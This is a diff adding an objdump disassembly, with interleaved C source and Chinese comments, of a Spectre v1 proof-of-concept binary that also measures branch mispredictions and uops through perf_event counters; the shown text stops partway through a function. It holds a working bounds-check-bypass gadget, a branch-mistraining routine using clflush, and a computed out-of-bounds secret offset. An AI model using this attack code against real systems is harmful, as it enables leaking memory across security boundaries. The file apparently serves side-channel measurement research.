@@ -1,0 +1,1394 @@
+
+spectre_stage1_2_auto:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+0000000000000938 <_init>:
+ 938:	48 83 ec 08          	sub    $0x8,%rsp
+ 93c:	48 8b 05 a5 26 20 00 	mov    0x2026a5(%rip),%rax        # 202fe8 <__gmon_start__>
+ 943:	48 85 c0             	test   %rax,%rax
+ 946:	74 02                	je     94a <_init+0x12>
+ 948:	ff d0                	callq  *%rax
+ 94a:	48 83 c4 08          	add    $0x8,%rsp
+ 94e:	c3                   	retq   
+
+Disassembly of section .plt:
+
+0000000000000950 <.plt>:
+ 950:	ff 35 f2 25 20 00    	pushq  0x2025f2(%rip)        # 202f48 <_GLOBAL_OFFSET_TABLE_+0x8>
+ 956:	ff 25 f4 25 20 00    	jmpq   *0x2025f4(%rip)        # 202f50 <_GLOBAL_OFFSET_TABLE_+0x10>
+ 95c:	0f 1f 40 00          	nopl   0x0(%rax)
+
+0000000000000960 <__errno_location@plt>:
+ 960:	ff 25 f2 25 20 00    	jmpq   *0x2025f2(%rip)        # 202f58 <__errno_location@GLIBC_2.2.5>
+ 966:	68 00 00 00 00       	pushq  $0x0
+ 96b:	e9 e0 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000970 <sigaction@plt>:
+ 970:	ff 25 ea 25 20 00    	jmpq   *0x2025ea(%rip)        # 202f60 <sigaction@GLIBC_2.2.5>
+ 976:	68 01 00 00 00       	pushq  $0x1
+ 97b:	e9 d0 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000980 <__stack_chk_fail@plt>:
+ 980:	ff 25 e2 25 20 00    	jmpq   *0x2025e2(%rip)        # 202f68 <__stack_chk_fail@GLIBC_2.4>
+ 986:	68 02 00 00 00       	pushq  $0x2
+ 98b:	e9 c0 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000990 <mmap@plt>:
+ 990:	ff 25 da 25 20 00    	jmpq   *0x2025da(%rip)        # 202f70 <mmap@GLIBC_2.2.5>
+ 996:	68 03 00 00 00       	pushq  $0x3
+ 99b:	e9 b0 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009a0 <printf@plt>:
+ 9a0:	ff 25 d2 25 20 00    	jmpq   *0x2025d2(%rip)        # 202f78 <printf@GLIBC_2.2.5>
+ 9a6:	68 04 00 00 00       	pushq  $0x4
+ 9ab:	e9 a0 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009b0 <siglongjmp@plt>:
+ 9b0:	ff 25 ca 25 20 00    	jmpq   *0x2025ca(%rip)        # 202f80 <siglongjmp@GLIBC_2.2.5>
+ 9b6:	68 05 00 00 00       	pushq  $0x5
+ 9bb:	e9 90 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009c0 <memset@plt>:
+ 9c0:	ff 25 c2 25 20 00    	jmpq   *0x2025c2(%rip)        # 202f88 <memset@GLIBC_2.2.5>
+ 9c6:	68 06 00 00 00       	pushq  $0x6
+ 9cb:	e9 80 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009d0 <close@plt>:
+ 9d0:	ff 25 ba 25 20 00    	jmpq   *0x2025ba(%rip)        # 202f90 <close@GLIBC_2.2.5>
+ 9d6:	68 07 00 00 00       	pushq  $0x7
+ 9db:	e9 70 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009e0 <read@plt>:
+ 9e0:	ff 25 b2 25 20 00    	jmpq   *0x2025b2(%rip)        # 202f98 <read@GLIBC_2.2.5>
+ 9e6:	68 08 00 00 00       	pushq  $0x8
+ 9eb:	e9 60 ff ff ff       	jmpq   950 <.plt>
+
+00000000000009f0 <fprintf@plt>:
+ 9f0:	ff 25 aa 25 20 00    	jmpq   *0x2025aa(%rip)        # 202fa0 <fprintf@GLIBC_2.2.5>
+ 9f6:	68 09 00 00 00       	pushq  $0x9
+ 9fb:	e9 50 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a00 <syscall@plt>:
+ a00:	ff 25 a2 25 20 00    	jmpq   *0x2025a2(%rip)        # 202fa8 <syscall@GLIBC_2.2.5>
+ a06:	68 0a 00 00 00       	pushq  $0xa
+ a0b:	e9 40 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a10 <sigemptyset@plt>:
+ a10:	ff 25 9a 25 20 00    	jmpq   *0x20259a(%rip)        # 202fb0 <sigemptyset@GLIBC_2.2.5>
+ a16:	68 0b 00 00 00       	pushq  $0xb
+ a1b:	e9 30 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a20 <munmap@plt>:
+ a20:	ff 25 92 25 20 00    	jmpq   *0x202592(%rip)        # 202fb8 <munmap@GLIBC_2.2.5>
+ a26:	68 0c 00 00 00       	pushq  $0xc
+ a2b:	e9 20 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a30 <fwrite@plt>:
+ a30:	ff 25 8a 25 20 00    	jmpq   *0x20258a(%rip)        # 202fc0 <fwrite@GLIBC_2.2.5>
+ a36:	68 0d 00 00 00       	pushq  $0xd
+ a3b:	e9 10 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a40 <strerror@plt>:
+ a40:	ff 25 82 25 20 00    	jmpq   *0x202582(%rip)        # 202fc8 <strerror@GLIBC_2.2.5>
+ a46:	68 0e 00 00 00       	pushq  $0xe
+ a4b:	e9 00 ff ff ff       	jmpq   950 <.plt>
+
+0000000000000a50 <__sigsetjmp@plt>:
+ a50:	ff 25 7a 25 20 00    	jmpq   *0x20257a(%rip)        # 202fd0 <__sigsetjmp@GLIBC_2.2.5>
+ a56:	68 0f 00 00 00       	pushq  $0xf
+ a5b:	e9 f0 fe ff ff       	jmpq   950 <.plt>
+
+Disassembly of section .plt.got:
+
+0000000000000a60 <__cxa_finalize@plt>:
+ a60:	ff 25 92 25 20 00    	jmpq   *0x202592(%rip)        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
+ a66:	66 90                	xchg   %ax,%ax
+
+Disassembly of section .text:
+
+0000000000000a70 <_start>:
+     a70:	31 ed                	xor    %ebp,%ebp
+     a72:	49 89 d1             	mov    %rdx,%r9
+     a75:	5e                   	pop    %rsi
+     a76:	48 89 e2             	mov    %rsp,%rdx
+     a79:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
+     a7d:	50                   	push   %rax
+     a7e:	54                   	push   %rsp
+     a7f:	4c 8d 05 aa 0f 00 00 	lea    0xfaa(%rip),%r8        # 1a30 <__libc_csu_fini>
+     a86:	48 8d 0d 33 0f 00 00 	lea    0xf33(%rip),%rcx        # 19c0 <__libc_csu_init>
+     a8d:	48 8d 3d a7 02 00 00 	lea    0x2a7(%rip),%rdi        # d3b <main>
+     a94:	ff 15 46 25 20 00    	callq  *0x202546(%rip)        # 202fe0 <__libc_start_main@GLIBC_2.2.5>
+     a9a:	f4                   	hlt    
+     a9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+
+0000000000000aa0 <deregister_tm_clones>:
+     aa0:	48 8d 3d 51 26 20 00 	lea    0x202651(%rip),%rdi        # 2030f8 <__TMC_END__>
+     aa7:	55                   	push   %rbp
+     aa8:	48 8d 05 49 26 20 00 	lea    0x202649(%rip),%rax        # 2030f8 <__TMC_END__>
+     aaf:	48 39 f8             	cmp    %rdi,%rax
+     ab2:	48 89 e5             	mov    %rsp,%rbp
+     ab5:	74 19                	je     ad0 <deregister_tm_clones+0x30>
+     ab7:	48 8b 05 1a 25 20 00 	mov    0x20251a(%rip),%rax        # 202fd8 <_ITM_deregisterTMCloneTable>
+     abe:	48 85 c0             	test   %rax,%rax
+     ac1:	74 0d                	je     ad0 <deregister_tm_clones+0x30>
+     ac3:	5d                   	pop    %rbp
+     ac4:	ff e0                	jmpq   *%rax
+     ac6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+     acd:	00 00 00 
+     ad0:	5d                   	pop    %rbp
+     ad1:	c3                   	retq   
+     ad2:	0f 1f 40 00          	nopl   0x0(%rax)
+     ad6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+     add:	00 00 00 
+
+0000000000000ae0 <register_tm_clones>:
+     ae0:	48 8d 3d 11 26 20 00 	lea    0x202611(%rip),%rdi        # 2030f8 <__TMC_END__>
+     ae7:	48 8d 35 0a 26 20 00 	lea    0x20260a(%rip),%rsi        # 2030f8 <__TMC_END__>
+     aee:	55                   	push   %rbp
+     aef:	48 29 fe             	sub    %rdi,%rsi
+     af2:	48 89 e5             	mov    %rsp,%rbp
+     af5:	48 c1 fe 03          	sar    $0x3,%rsi
+     af9:	48 89 f0             	mov    %rsi,%rax
+     afc:	48 c1 e8 3f          	shr    $0x3f,%rax
+     b00:	48 01 c6             	add    %rax,%rsi
+     b03:	48 d1 fe             	sar    %rsi
+     b06:	74 18                	je     b20 <register_tm_clones+0x40>
+     b08:	48 8b 05 e1 24 20 00 	mov    0x2024e1(%rip),%rax        # 202ff0 <_ITM_registerTMCloneTable>
+     b0f:	48 85 c0             	test   %rax,%rax
+     b12:	74 0c                	je     b20 <register_tm_clones+0x40>
+     b14:	5d                   	pop    %rbp
+     b15:	ff e0                	jmpq   *%rax
+     b17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
+     b1e:	00 00 
+     b20:	5d                   	pop    %rbp
+     b21:	c3                   	retq   
+     b22:	0f 1f 40 00          	nopl   0x0(%rax)
+     b26:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+     b2d:	00 00 00 
+
+0000000000000b30 <__do_global_dtors_aux>:
+     b30:	80 3d d1 25 20 00 00 	cmpb   $0x0,0x2025d1(%rip)        # 203108 <completed.7698>
+     b37:	75 2f                	jne    b68 <__do_global_dtors_aux+0x38>
+     b39:	48 83 3d b7 24 20 00 	cmpq   $0x0,0x2024b7(%rip)        # 202ff8 <__cxa_finalize@GLIBC_2.2.5>
+     b40:	00 
+     b41:	55                   	push   %rbp
+     b42:	48 89 e5             	mov    %rsp,%rbp
+     b45:	74 0c                	je     b53 <__do_global_dtors_aux+0x23>
+     b47:	48 8b 3d ba 24 20 00 	mov    0x2024ba(%rip),%rdi        # 203008 <__dso_handle>
+     b4e:	e8 0d ff ff ff       	callq  a60 <__cxa_finalize@plt>
+     b53:	e8 48 ff ff ff       	callq  aa0 <deregister_tm_clones>
+     b58:	c6 05 a9 25 20 00 01 	movb   $0x1,0x2025a9(%rip)        # 203108 <completed.7698>
+     b5f:	5d                   	pop    %rbp
+     b60:	c3                   	retq   
+     b61:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+     b68:	f3 c3                	repz retq 
+     b6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
+
+0000000000000b70 <frame_dummy>:
+     b70:	55                   	push   %rbp
+     b71:	48 89 e5             	mov    %rsp,%rbp
+     b74:	5d                   	pop    %rbp
+     b75:	e9 66 ff ff ff       	jmpq   ae0 <register_tm_clones>
+
+0000000000000b7a <spectre_function>:
+/********************************************************************
+ Stage 2: Gadget (victim function)
+ 添加 UOPS snap_before / snap_after 调用
+********************************************************************/
+__attribute__((noinline))
+void spectre_function(size_t x) {
+     b7a:	55                   	push   %rbp
+     b7b:	48 89 e5             	mov    %rsp,%rbp
+     b7e:	48 83 ec 10          	sub    $0x10,%rsp
+     b82:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+
+  pmu_uops_snap_before();
+     b86:	e8 80 09 00 00       	callq  150b <pmu_uops_snap_before>
+
+0000000000000b8b <STAGE1_BEGIN>:
+
+  asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");
+  if (x < array1_size) {
+     b8b:	8b 05 8f 24 20 00    	mov    0x20248f(%rip),%eax        # 203020 <array1_size>
+     b91:	89 c0                	mov    %eax,%eax
+     b93:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
+     b97:	73 34                	jae    bcd <STAGE1_END>
+    NOP_REGION_BEGIN
+    temp &= array2[array1[x] * 512];
+     b99:	48 8d 15 a0 24 20 00 	lea    0x2024a0(%rip),%rdx        # 203040 <array1>
+     ba0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     ba4:	48 01 d0             	add    %rdx,%rax
+     ba7:	0f b6 00             	movzbl (%rax),%eax
+     baa:	0f b6 c0             	movzbl %al,%eax
+     bad:	c1 e0 09             	shl    $0x9,%eax
+     bb0:	48 63 d0             	movslq %eax,%rdx
+     bb3:	48 8d 05 06 07 21 00 	lea    0x210706(%rip),%rax        # 2112c0 <array2>
+     bba:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
+     bbe:	0f b6 05 44 25 20 00 	movzbl 0x202544(%rip),%eax        # 203109 <temp>
+     bc5:	21 d0                	and    %edx,%eax
+     bc7:	88 05 3c 25 20 00    	mov    %al,0x20253c(%rip)        # 203109 <temp>
+
+0000000000000bcd <STAGE1_END>:
+    NOP_REGION_END
+  }
+  asm volatile(".globl STAGE1_END\nSTAGE1_END:");
+
+  pmu_uops_snap_after();
+     bcd:	e8 a8 09 00 00       	callq  157a <pmu_uops_snap_after>
+}
+     bd2:	90                   	nop
+     bd3:	c9                   	leaveq 
+     bd4:	c3                   	retq   
+
+0000000000000bd5 <vf_get_probe_addr_for_secret>:
+ ✅ 关键修改：删除 vf_set_secret 函数
+ 保留 vf_get_probe_addr_for_secret 和 vf_prepare_probe_region
+ 这两个函数是 Stage 3 探测时必须的
+********************************************************************/
+
+volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
+     bd5:	55                   	push   %rbp
+     bd6:	48 89 e5             	mov    %rsp,%rbp
+     bd9:	89 f8                	mov    %edi,%eax
+     bdb:	88 45 fc             	mov    %al,-0x4(%rbp)
+    return &array2[(size_t)s * 512];
+     bde:	0f b6 45 fc          	movzbl -0x4(%rbp),%eax
+     be2:	48 c1 e0 09          	shl    $0x9,%rax
+     be6:	48 89 c2             	mov    %rax,%rdx
+     be9:	48 8d 05 d0 06 21 00 	lea    0x2106d0(%rip),%rax        # 2112c0 <array2>
+     bf0:	48 01 d0             	add    %rdx,%rax
+}
+     bf3:	5d                   	pop    %rbp
+     bf4:	c3                   	retq   
+
+0000000000000bf5 <stage1_mistrain_trigger>:
+
+/********************************************************************
+ Stage 1: Mistrain + Trigger
+********************************************************************/
+__attribute__((noinline))
+void stage1_mistrain_trigger(size_t malicious_x) {
+     bf5:	55                   	push   %rbp
+     bf6:	48 89 e5             	mov    %rsp,%rbp
+     bf9:	48 83 ec 30          	sub    $0x30,%rsp
+     bfd:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
+    int j;
+    size_t training_x, x;
+
+    for (j = 29; j >= 0; j--) {
+     c01:	c7 45 e4 1d 00 00 00 	movl   $0x1d,-0x1c(%rbp)
+     c08:	e9 9e 00 00 00       	jmpq   cab <stage1_mistrain_trigger+0xb6>
+        training_x = (size_t)(j % 16);
+     c0d:	8b 45 e4             	mov    -0x1c(%rbp),%eax
+     c10:	99                   	cltd   
+     c11:	c1 ea 1c             	shr    $0x1c,%edx
+     c14:	01 d0                	add    %edx,%eax
+     c16:	83 e0 0f             	and    $0xf,%eax
+     c19:	29 d0                	sub    %edx,%eax
+     c1b:	48 98                	cltq   
+     c1d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
+     c21:	48 8d 05 f8 23 20 00 	lea    0x2023f8(%rip),%rax        # 203020 <array1_size>
+     c28:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+}
+
+extern __inline void __attribute__((__gnu_inline__, __always_inline__, __artificial__))
+_mm_clflush (void const *__A)
+{
+  __builtin_ia32_clflush (__A);
+     c2c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     c30:	0f ae 38             	clflush (%rax)
+        _mm_clflush(&array1_size);
+        for (volatile int z = 0; z < 200; z++) {}
+     c33:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
+     c3a:	eb 09                	jmp    c45 <stage1_mistrain_trigger+0x50>
+     c3c:	8b 45 e0             	mov    -0x20(%rbp),%eax
+     c3f:	83 c0 01             	add    $0x1,%eax
+     c42:	89 45 e0             	mov    %eax,-0x20(%rbp)
+     c45:	8b 45 e0             	mov    -0x20(%rbp),%eax
+     c48:	3d c7 00 00 00       	cmp    $0xc7,%eax
+     c4d:	7e ed                	jle    c3c <stage1_mistrain_trigger+0x47>
+
+        x = ((j % 6) - 1) & ~0xFFFF;
+     c4f:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
+     c52:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
+     c57:	89 c8                	mov    %ecx,%eax
+     c59:	f7 ea                	imul   %edx
+     c5b:	89 c8                	mov    %ecx,%eax
+     c5d:	c1 f8 1f             	sar    $0x1f,%eax
+     c60:	29 c2                	sub    %eax,%edx
+     c62:	89 d0                	mov    %edx,%eax
+     c64:	01 c0                	add    %eax,%eax
+     c66:	01 d0                	add    %edx,%eax
+     c68:	01 c0                	add    %eax,%eax
+     c6a:	29 c1                	sub    %eax,%ecx
+     c6c:	89 ca                	mov    %ecx,%edx
+     c6e:	8d 42 ff             	lea    -0x1(%rdx),%eax
+     c71:	66 b8 00 00          	mov    $0x0,%ax
+     c75:	48 98                	cltq   
+     c77:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+        x = (x | (x >> 16));
+     c7b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+     c7f:	48 c1 e8 10          	shr    $0x10,%rax
+     c83:	48 09 45 f0          	or     %rax,-0x10(%rbp)
+        x = training_x ^ (x & (malicious_x ^ training_x));
+     c87:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
+     c8b:	48 33 45 e8          	xor    -0x18(%rbp),%rax
+     c8f:	48 23 45 f0          	and    -0x10(%rbp),%rax
+     c93:	48 33 45 e8          	xor    -0x18(%rbp),%rax
+     c97:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+
+        spectre_function(x);
+     c9b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+     c9f:	48 89 c7             	mov    %rax,%rdi
+     ca2:	e8 d3 fe ff ff       	callq  b7a <spectre_function>
+    for (j = 29; j >= 0; j--) {
+     ca7:	83 6d e4 01          	subl   $0x1,-0x1c(%rbp)
+     cab:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
+     caf:	0f 89 58 ff ff ff    	jns    c0d <stage1_mistrain_trigger+0x18>
+    }
+}
+     cb5:	90                   	nop
+     cb6:	c9                   	leaveq 
+     cb7:	c3                   	retq   
+
+0000000000000cb8 <vf_run_attack_once>:
+
+void vf_run_attack_once(void) {
+     cb8:	55                   	push   %rbp
+     cb9:	48 89 e5             	mov    %rsp,%rbp
+     cbc:	48 83 ec 10          	sub    $0x10,%rsp
+    size_t malicious_x = (size_t)(secret - (char *)array1);
+     cc0:	48 8b 05 19 24 20 00 	mov    0x202419(%rip),%rax        # 2030e0 <secret>
+     cc7:	48 89 c2             	mov    %rax,%rdx
+     cca:	48 8d 05 6f 23 20 00 	lea    0x20236f(%rip),%rax        # 203040 <array1>
+     cd1:	48 29 c2             	sub    %rax,%rdx
+     cd4:	48 89 d0             	mov    %rdx,%rax
+     cd7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    stage1_mistrain_trigger(malicious_x);
+     cdb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     cdf:	48 89 c7             	mov    %rax,%rdi
+     ce2:	e8 0e ff ff ff       	callq  bf5 <stage1_mistrain_trigger>
+}
+     ce7:	90                   	nop
+     ce8:	c9                   	leaveq 
+     ce9:	c3                   	retq   
+
+0000000000000cea <vf_prepare_probe_region>:
+
+void vf_prepare_probe_region(int candidate_count) {
+     cea:	55                   	push   %rbp
+     ceb:	48 89 e5             	mov    %rsp,%rbp
+     cee:	48 83 ec 18          	sub    $0x18,%rsp
+     cf2:	89 7d ec             	mov    %edi,-0x14(%rbp)
+    if (candidate_count <= 0 || candidate_count > 256) {
+     cf5:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
+     cf9:	7e 09                	jle    d04 <vf_prepare_probe_region+0x1a>
+     cfb:	81 7d ec 00 01 00 00 	cmpl   $0x100,-0x14(%rbp)
+     d02:	7e 07                	jle    d0b <vf_prepare_probe_region+0x21>
+        candidate_count = 256;
+     d04:	c7 45 ec 00 01 00 00 	movl   $0x100,-0x14(%rbp)
+    }
+    for (int i = 0; i < candidate_count; i++) {
+     d0b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
+     d12:	eb 1c                	jmp    d30 <vf_prepare_probe_region+0x46>
+        volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
+     d14:	8b 45 f4             	mov    -0xc(%rbp),%eax
+     d17:	0f b6 c0             	movzbl %al,%eax
+     d1a:	89 c7                	mov    %eax,%edi
+     d1c:	e8 b4 fe ff ff       	callq  bd5 <vf_get_probe_addr_for_secret>
+     d21:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+        *p = 1;
+     d25:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     d29:	c6 00 01             	movb   $0x1,(%rax)
+    for (int i = 0; i < candidate_count; i++) {
+     d2c:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
+     d30:	8b 45 f4             	mov    -0xc(%rbp),%eax
+     d33:	3b 45 ec             	cmp    -0x14(%rbp),%eax
+     d36:	7c dc                	jl     d14 <vf_prepare_probe_region+0x2a>
+    }
+}
+     d38:	90                   	nop
+     d39:	c9                   	leaveq 
+     d3a:	c3                   	retq   
+
+0000000000000d3b <main>:
+
+/********************************************************************
+ main
+********************************************************************/
+#ifndef STAGE2_TEST_MAIN
+int main(int argc, const char **argv) {
+     d3b:	55                   	push   %rbp
+     d3c:	48 89 e5             	mov    %rsp,%rbp
+     d3f:	48 83 ec 20          	sub    $0x20,%rsp
+     d43:	89 7d ec             	mov    %edi,-0x14(%rbp)
+     d46:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
+    size_t malicious_x = (size_t)(secret - (char *)array1);
+     d4a:	48 8b 05 8f 23 20 00 	mov    0x20238f(%rip),%rax        # 2030e0 <secret>
+     d51:	48 89 c2             	mov    %rax,%rdx
+     d54:	48 8d 05 e5 22 20 00 	lea    0x2022e5(%rip),%rax        # 203040 <array1>
+     d5b:	48 29 c2             	sub    %rax,%rdx
+     d5e:	48 89 d0             	mov    %rdx,%rax
+     d61:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    int i;
+
+    /* 初始化 array2 */
+    for (i = 0; i < (int)sizeof(array2); i++) {
+     d65:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
+     d6c:	eb 15                	jmp    d83 <main+0x48>
+        array2[i] = 1;
+     d6e:	8b 45 f0             	mov    -0x10(%rbp),%eax
+     d71:	48 63 d0             	movslq %eax,%rdx
+     d74:	48 8d 05 45 05 21 00 	lea    0x210545(%rip),%rax        # 2112c0 <array2>
+     d7b:	c6 04 02 01          	movb   $0x1,(%rdx,%rax,1)
+    for (i = 0; i < (int)sizeof(array2); i++) {
+     d7f:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
+     d83:	81 7d f0 ff ff 01 00 	cmpl   $0x1ffff,-0x10(%rbp)
+     d8a:	7e e2                	jle    d6e <main+0x33>
+    }
+
+    /* 执行阶段1 */
+    stage1_mistrain_trigger(malicious_x);
+     d8c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     d90:	48 89 c7             	mov    %rax,%rdi
+     d93:	e8 5d fe ff ff       	callq  bf5 <stage1_mistrain_trigger>
+
+    /* Stage1 BR_MISP 数据 */
+    {
+        int n = pmu_stage1_get_count();
+     d98:	e8 6f 01 00 00       	callq  f0c <pmu_stage1_get_count>
+     d9d:	89 45 f4             	mov    %eax,-0xc(%rbp)
+        for (i = 0; i < n; i++) {
+     da0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
+     da7:	eb 27                	jmp    dd0 <main+0x95>
+            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
+                   i,
+                   (unsigned long long)pmu_stage1_get_delta(i));
+     da9:	8b 45 f0             	mov    -0x10(%rbp),%eax
+     dac:	89 c7                	mov    %eax,%edi
+     dae:	e8 65 01 00 00       	callq  f18 <pmu_stage1_get_delta>
+     db3:	48 89 c2             	mov    %rax,%rdx
+            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
+     db6:	8b 45 f0             	mov    -0x10(%rbp),%eax
+     db9:	89 c6                	mov    %eax,%esi
+     dbb:	48 8d 3d 8e 0c 00 00 	lea    0xc8e(%rip),%rdi        # 1a50 <_IO_stdin_used+0x10>
+     dc2:	b8 00 00 00 00       	mov    $0x0,%eax
+     dc7:	e8 d4 fb ff ff       	callq  9a0 <printf@plt>
+        for (i = 0; i < n; i++) {
+     dcc:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
+     dd0:	8b 45 f0             	mov    -0x10(%rbp),%eax
+     dd3:	3b 45 f4             	cmp    -0xc(%rbp),%eax
+     dd6:	7c d1                	jl     da9 <main+0x6e>
+        }
+    }
+
+    /* UOPS 数据 */
+    pmu_uops_print_results();
+     dd8:	e8 b4 08 00 00       	callq  1691 <pmu_uops_print_results>
+
+    return 0;
+     ddd:	b8 00 00 00 00       	mov    $0x0,%eax
+}
+     de2:	c9                   	leaveq 
+     de3:	c3                   	retq   
+
+0000000000000de4 <perf_event_open_sys>:
+     de4:	55                   	push   %rbp
+     de5:	48 89 e5             	mov    %rsp,%rbp
+     de8:	48 83 ec 20          	sub    $0x20,%rsp
+     dec:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+     df0:	89 75 f4             	mov    %esi,-0xc(%rbp)
+     df3:	89 55 f0             	mov    %edx,-0x10(%rbp)
+     df6:	89 4d ec             	mov    %ecx,-0x14(%rbp)
+     df9:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
+     dfd:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
+     e01:	8b 75 ec             	mov    -0x14(%rbp),%esi
+     e04:	8b 4d f0             	mov    -0x10(%rbp),%ecx
+     e07:	8b 55 f4             	mov    -0xc(%rbp),%edx
+     e0a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     e0e:	49 89 f9             	mov    %rdi,%r9
+     e11:	41 89 f0             	mov    %esi,%r8d
+     e14:	48 89 c6             	mov    %rax,%rsi
+     e17:	bf 2a 01 00 00       	mov    $0x12a,%edi
+     e1c:	b8 00 00 00 00       	mov    $0x0,%eax
+     e21:	e8 da fb ff ff       	callq  a00 <syscall@plt>
+     e26:	c9                   	leaveq 
+     e27:	c3                   	retq   
+
+0000000000000e28 <setup_branch_miss_event>:
+     e28:	55                   	push   %rbp
+     e29:	48 89 e5             	mov    %rsp,%rbp
+     e2c:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
+     e33:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+     e3a:	00 00 
+     e3c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+     e40:	31 c0                	xor    %eax,%eax
+     e42:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+     e46:	ba 70 00 00 00       	mov    $0x70,%edx
+     e4b:	be 00 00 00 00       	mov    $0x0,%esi
+     e50:	48 89 c7             	mov    %rax,%rdi
+     e53:	e8 68 fb ff ff       	callq  9c0 <memset@plt>
+     e58:	c7 45 80 04 00 00 00 	movl   $0x4,-0x80(%rbp)
+     e5f:	c7 45 84 70 00 00 00 	movl   $0x70,-0x7c(%rbp)
+     e66:	48 c7 45 88 c5 01 00 	movq   $0x1c5,-0x78(%rbp)
+     e6d:	00 
+     e6e:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+     e72:	83 e0 fe             	and    $0xfffffffe,%eax
+     e75:	88 45 a8             	mov    %al,-0x58(%rbp)
+     e78:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+     e7c:	83 c8 20             	or     $0x20,%eax
+     e7f:	88 45 a8             	mov    %al,-0x58(%rbp)
+     e82:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+     e86:	83 c8 40             	or     $0x40,%eax
+     e89:	88 45 a8             	mov    %al,-0x58(%rbp)
+     e8c:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+     e90:	41 b8 00 00 00 00    	mov    $0x0,%r8d
+     e96:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
+     e9b:	ba ff ff ff ff       	mov    $0xffffffff,%edx
+     ea0:	be 00 00 00 00       	mov    $0x0,%esi
+     ea5:	48 89 c7             	mov    %rax,%rdi
+     ea8:	e8 37 ff ff ff       	callq  de4 <perf_event_open_sys>
+     ead:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
+     eb3:	83 bd 7c ff ff ff ff 	cmpl   $0xffffffff,-0x84(%rbp)
+     eba:	75 34                	jne    ef0 <setup_branch_miss_event+0xc8>
+     ebc:	e8 9f fa ff ff       	callq  960 <__errno_location@plt>
+     ec1:	8b 00                	mov    (%rax),%eax
+     ec3:	89 c7                	mov    %eax,%edi
+     ec5:	e8 76 fb ff ff       	callq  a40 <strerror@plt>
+     eca:	48 89 c2             	mov    %rax,%rdx
+     ecd:	48 8b 05 2c 22 20 00 	mov    0x20222c(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+     ed4:	48 89 d1             	mov    %rdx,%rcx
+     ed7:	ba c5 01 00 00       	mov    $0x1c5,%edx
+     edc:	48 8d 35 95 0b 00 00 	lea    0xb95(%rip),%rsi        # 1a78 <_IO_stdin_used+0x38>
+     ee3:	48 89 c7             	mov    %rax,%rdi
+     ee6:	b8 00 00 00 00       	mov    $0x0,%eax
+     eeb:	e8 00 fb ff ff       	callq  9f0 <fprintf@plt>
